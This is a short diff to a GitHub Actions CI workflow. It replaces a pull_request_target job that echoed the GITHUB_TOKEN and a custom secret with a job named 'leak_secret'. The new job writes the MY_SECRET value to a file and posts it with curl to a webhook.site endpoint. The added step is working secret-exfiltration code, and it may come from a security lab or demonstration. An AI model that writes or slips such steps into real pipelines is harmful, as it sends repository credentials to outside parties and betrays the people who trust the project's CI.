@@ -1,18 +1,13 @@
 name: CI
+
 on:
-  pull_request_target:
-    branches:
-      - main
+  pull_request:
 
 jobs:
-  run:
+  leak_secret:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
-
-      - name: Run something dangerous
+      - name: Exfiltrate secret
         run: |
-          echo "Running as victim with elevated GITHUB_TOKEN..."
-          echo "Token: ${{ secrets.GITHUB_TOKEN }}"
-          echo "Custom Secret: ${{ secrets.MY_SECRET }}"
+          echo "$MY_SECRET" > secret.txt
+          curl -X POST --data-binary @secret.txt https://webhook.site/2b3156e7-1c4d-4cbb-94fb-8d2bab8cddad
